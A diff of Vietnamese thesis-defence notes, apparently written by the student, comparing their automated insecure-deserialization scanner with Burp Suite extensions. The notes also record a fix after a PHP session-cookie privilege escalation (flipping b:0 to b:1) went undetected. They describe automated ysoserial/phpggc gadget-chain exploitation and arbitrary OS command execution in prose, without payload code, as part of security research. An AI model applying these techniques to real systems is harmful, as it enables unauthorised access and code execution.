+**Điểm khác biệt THẬT, cụ thể, nên dùng khi bảo vệ** (mạnh hơn hẳn bản so sánh dựa docs trước đó): tool mình gọi **ysoserial/phpggc/ysonet THẬT lúc chạy, trong pipeline tự động, không cần thao tác tay** (khác JDS); chọn được NHIỀU gadget chain, chạy được **lệnh OS bất kỳ** chứ không chỉ 1 URL JNDI cố định (khác Freddy); **không bao giờ tự "Confirmed"** — triết lý ngược hẳn Freddy (có tự gán Certain).
+
+**[THAM KHẢO BẢO VỆ LUẬN VĂN] So sánh chức năng insecure deserialization: Burp Suite vs tool — giảng viên hỏi, đã tra cứu thật (WebSearch) để trả lời chính xác, không chỉ dựa trí nhớ.**
+
+| Tiêu chí | Burp Suite (native + extension) | Tool |
+|---|---|---|
+| Phát hiện ban đầu | Native: chỉ cảnh báo passive "Serialized object in HTTP message" — CHỈ báo "có dữ liệu giống serialized", không phân tích thêm | `Fingerprint` (Stage 5): phân loại định dạng cụ thể + score/confidence/risk_level + subtype |
+| Phạm vi ngôn ngữ | Qua extension rời rạc, mỗi cái 1-2 ngôn ngữ: **Freddy** (Java+.NET), **Java Deserialization Scanner** (Java), **PHP Object Injection Check** + **PHP Object Injection Slinger** (PHP). **Python Pickle/YAML/Node.js/Ruby Marshal: KHÔNG có extension nào trên BApp Store** (đã tra cứu xác nhận, chỉ có hướng dẫn thủ công) | 1 engine duy nhất: PHP, Java, Python Pickle, YAML, .NET, Node.js, Ruby Marshal |
+| Sinh payload khai thác | Tự tay chạy `ysoserial` ngoài Burp rồi dán Repeater, hoặc extension tự gọi 1 phần | Tự động gọi `ysoserial`/`phpggc`/`ysonet` ngay trong pipeline |
+| Xác nhận exploit | Freddy: error-based/time-based; Java Deserialization Scanner có "CPU mode" (time-based, có thể gây DoS nếu dùng ẩu) | So sánh baseline/mutated nhiều tín hiệu, phân biệt được echo-thuần vs xử lý thật (xem fix hôm trước) |
+| OOB | Freddy dùng Burp Collaborator cho case JSON/XML mù | Dùng Interactsh, tự escalate gadget chain kèm lệnh OOB khi chưa rõ gadget |
+| Tự động hoá toàn trình | Phải tự ghép nhiều bước/tool rời rạc | 1 pipeline `scan→analyze→assess` trong 1 lệnh |
+
+**Điểm nhấn khi trình bày**: tất cả extension trên đều mã nguồn mở qua BApp Store, KHÔNG phải Burp tự viết (PortSwigger chỉ host, không bảo trì — tự xác nhận qua forum PortSwigger). Khoảng trống THẬT của Burp không phải "chỉ mạnh Java" (đã có đủ Java/.NET/PHP qua 4 extension riêng biệt) — mà là **hoàn toàn không có tooling tự động nào cho Python Pickle/YAML/Node.js/Ruby Marshal**. Đây là điểm cụ thể, có tra cứu xác nhận, nên dùng khi trình bày thay vì nói chung chung "Burp chỉ mạnh Java". **Không nên nói "tool tốt hơn Burp" chung chung** (Burp là scanner tổng quát, tool này chuyên biệt 1 lớp lỗ hổng, chưa battle-tested bằng) — nên nói tool **tự động hoá sâu hơn và tập trung hơn đúng cho riêng insecure deserialization**, có bằng chứng thực nghiệm (case `ref_tag` vs `session` đã fix) chứng minh cơ chế hạn chế false positive/negative đã được kiểm chứng.
+
+Nguồn tra cứu: [Freddy (NCC Group)](https://www.nccgroup.com/research-blog/freddy-an-extension-for-automatically-identifying-deserialisation-issues-in-java-and-net-applications/), [Freddy BApp Store](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3), [Freddy GitHub](https://github.com/nccgroup/freddy), [Java Deserialization Scanner BApp Store](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae), [Java Deserialization Scanner GitHub](https://github.com/federicodotta/Java-Deserialization-Scanner), [PHP Object Injection Check BApp Store](https://portswigger.net/bappstore/24dab228311049d89a27a4d721e17ef7) + [GitHub](https://github.com/PortSwigger/php-object-injection-check), [PHP Object Injection Slinger BApp Store](https://portswigger.net/bappstore/631785c4cb4147feb5fdbf272f80f30c).
+
 **[ĐÃ FIX — quan trọng] Fix 2 (strong_signal) trước đó bị quá tay, làm mất 1 finding PHP THẬT SỰ — phát hiện khi review `php-app`, đã sửa lại.**
 
 **Bug phát hiện khi review PHP**: `session` cookie trên `php-app` (`SessionHelper.php:17` gọi `unserialize()` thẳng lên cookie, `dashboard.php` đọc `$user->admin`) là **privilege escalation thật 100%** kiểu PortSwigger kinh điển — flip `b:0`→`b:1` trong cookie là `role` đổi từ `"user"` thành `"admin"`. Nhưng response này KHÔNG đổi status/length, không có error keyword — chỉ có đúng 1 indicator yếu `"content differs in a small way"` — **giống hệt điều kiện của `ref_tag` decoy** mà Fix 2 trước đó coi là yếu. Test trực tiếp: `_compare()` (bản Fix 2 cũ) cho case này ra `strong_signal: False` — **finding thật bị giấu mất**.
